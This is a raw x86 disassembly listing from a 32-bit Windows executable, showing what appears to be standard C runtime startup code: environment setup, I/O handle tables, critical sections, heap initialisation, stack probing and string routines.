  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
